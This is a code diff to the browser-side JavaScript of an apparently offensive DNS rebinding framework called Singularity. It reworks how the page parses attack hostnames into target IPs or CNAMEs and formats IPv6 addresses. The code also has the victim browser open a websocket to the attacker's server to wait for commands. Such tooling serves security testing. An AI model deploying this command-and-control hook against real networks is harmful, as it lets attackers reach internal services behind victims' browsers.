@@ -201,11 +201,10 @@ function timeout(ms, promise, controller) {
 }
 
 function begin(url) {
-    // s-hexstring1.hexstring2-session-method-e.attackerdomain
     const hostnameEl = document.getElementById('hostname');
-    const arr = window.location.hostname.split('-');
-    const sourceTarget = arr[1].split('.');
-    const target = decodeIpHexString(sourceTarget[1]);
+    const arr = window.location.hostname.match(/(?:[^-]|--)+/g); // Split on '-', not '--'
+    const sourceTarget = arr[1].split(/\.(.*)/s);
+    const target = decodeIpHexStringOrEcho(sourceTarget[1]).replaceAll('--','-'); // Remove escaping in CNAMEs
     const port = document.location.port ? document.location.port : '80';
     hostnameEl.innerText = `target: ${target}:${port}, session: ${arr[2]}, strategy: ${arr[3]}`;
     r = Rebinder();
@@ -215,98 +214,85 @@ function begin(url) {
 function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }
 
 
-// Helper functions for Command and Control via websockets
-function decodeIpHexString(hexString) {
-    // Validate hexString length
-    if (typeof hexString !== 'string') {
-      throw new Error("Input must be a string");
+// Attempt to decode a string input as an IPv4, IPv6 or CNAME
+// 'deadbeef' would be interpreted '222.173.190.239', which may not be what you want
+// In general with Singularity, the CNAME would be 'localhost' or something like a FQDN e.g., 'www.example.com'
+// and these will be parsed correctly
+function decodeIpHexStringOrEcho(input) {
+
+    if (typeof input !== 'string') {
+        throw new Error("Input must be a string");
     }
 
+    const hexString = input.trim();
+
+    // Only attempt decode for exact 8 (IPv4) or 32 (IPv6) hex chars
+    if (!/^(?:[0-9A-Fa-f]{8}|[0-9A-Fa-f]{32})$/.test(hexString)) {
+        return input; // not a candidate — leave as-is (e.g., a CNAME)
+    }
+
+    // Parse hex into bytes
     const len = hexString.length;
-    if (len !== 8 && len !== 32) {
-      throw new Error(`Invalid hexstring length: ${len}. Must be 8 or 32.`);
-    }
-
-    if (!/^[0-9A-Fa-f]+$/.test(hexString)) {
-      throw new Error("Hexstring contains invalid characters");
-    }
-
     const bytes = new Uint8Array(len / 2);
     for (let i = 0; i < len; i += 2) {
-      bytes[i / 2] = parseInt(hexString.slice(i, i + 2), 16);
+        const byte = parseInt(hexString.slice(i, i + 2), 16);
+        if (Number.isNaN(byte)) {
+            return input;
+        }
+        bytes[i / 2] = byte;
     }
 
+    // Render IPv4 or IPv6
     if (bytes.length === 4) {
-      return bytes.join('.');
-    } else {
-      return toIPv6String(bytes);
-    }
-  }
-
-  function toIPv6String(bytes) {
-    if (bytes.length !== 16) {
-      throw new Error("toIPv6String requires a 16-byte Uint8Array");
+        return Array.from(bytes).join('.');
+    } else if (bytes.length === 16) {
+        return toIPv6String(bytes);
     }
 
-    // Break into 8 groups of 16 bits
+    return input;
+}
+
+function toIPv6String(bytes) {
+    if (!(bytes instanceof Uint8Array) || bytes.length !== 16) {
+        return String(bytes);
+    }
+
+    // Build 8 groups of 16 bits in lowercase hex (no leading zeros removed yet)
     const groups = new Array(8);
     for (let i = 0; i < 8; i++) {
-      groups[i] = ((bytes[i * 2] << 8) | (bytes[i * 2 + 1])).toString(16);
+        const v = (bytes[i * 2] << 8) | bytes[i * 2 + 1];
+        groups[i] = v.toString(16);
     }
 
-    // Now we have an array of 8 hex strings, e.g. ["2a01", "7e00", "0", "0", "f03c", "91ff", "fe89", "2b5c"]
-    // We need to find the longest run of zero groups and compress them into '::'
-
-    // Find the longest run of consecutive "0" groups.
-    let bestStart = -1;
-    let bestLength = 0;
-
-    let currentStart = -1;
-    let currentLength = 0;
+    // Find the longest run of consecutive "0" groups for "::" compression
+    let bestStart = -1, bestLen = 0;
+    let curStart = -1, curLen = 0;
 
     for (let i = 0; i < 8; i++) {
-      if (groups[i] === '0') {
-        if (currentStart === -1) {
-          currentStart = i;
-          currentLength = 1;
-        } else {
-          currentLength++;
+        if (groups[i] === '0') {
+            if (curStart === -1) curStart = i;
+            curLen++;
+        } else if (curStart !== -1) {
+            if (curLen > bestLen) { bestStart = curStart; bestLen = curLen; }
+            curStart = -1; curLen = 0;
         }
-      } else {
-        if (currentStart !== -1) {
-          // We ended a run of zeros
-          if (currentLength > bestLength) {
-            bestStart = currentStart;
-            bestLength = currentLength;
-          }
-          currentStart = -1;
-          currentLength = 0;
-        }
-      }
     }
-    // Check if the last run ends at the end
-    if (currentStart !== -1 && currentLength > bestLength) {
-      bestStart = currentStart;
-      bestLength = currentLength;
+    if (curStart !== -1 && curLen > bestLen) {
+        bestStart = curStart; bestLen = curLen;
     }
 
-    // If we found a run of at least two zeros, compress them
-    if (bestLength > 1) {
-      const replacement = "::";
-      // groups[bestStart .. bestStart+bestLength-1] are "0"
-      const compressed = [
-        groups.slice(0, bestStart).join(":"),  // before zeros
-        groups.slice(bestStart + bestLength).join(":")  // after zeros
-      ].filter(Boolean).join(replacement);
-
-      // If all groups were zero => "::"
-      return compressed === "" ? "[::]" : `[${compressed}]`;
+    // Compress only if the run length >= 2
+    let result;
+    if (bestLen > 1) {
+        const head = groups.slice(0, bestStart).join(':');
+        const tail = groups.slice(bestStart + bestLen).join(':');
+        result = head && tail ? `${head}::${tail}` : head ? `${head}::` : tail ? `::${tail}` : '::';
     } else {
-      // No compressible run found => just join all groups
-      return `[${groups.join(":")}]`;
+        result = groups.join(':');
     }
-  }
 
+    return `[${result}]`;
+}
 
 // Request target to establish a websocket to Singularity server and wait for commands
 // Implements retries to handle multiple answer strategy and firewall blocks.
@@ -315,11 +301,12 @@ function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
         console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
         return;
     }
+    const arr = window.location.hostname.match(/(?:[^-]|--)+/g); // Split on '-', not '--'
+    const sourceTarget = arr[1].split(/\.(.*)/s);
+    const target = sourceTarget[0];
 
-    const partOne = document.location.hostname.split('-')[1]
-    const partTwo = partOne.split('.')[0]
-    const serverIp = decodeIpHexString(partTwo)
-    const wsurl = `${serverIp}:${wsProxyPort}`
+    const server = decodeIpHexStringOrEcho(target).replaceAll('--','-');
+    const wsurl = `${server}:${wsProxyPort}`
     let httpAuth = false;
 
     // Did successful rebinding request required HTTP Auth?
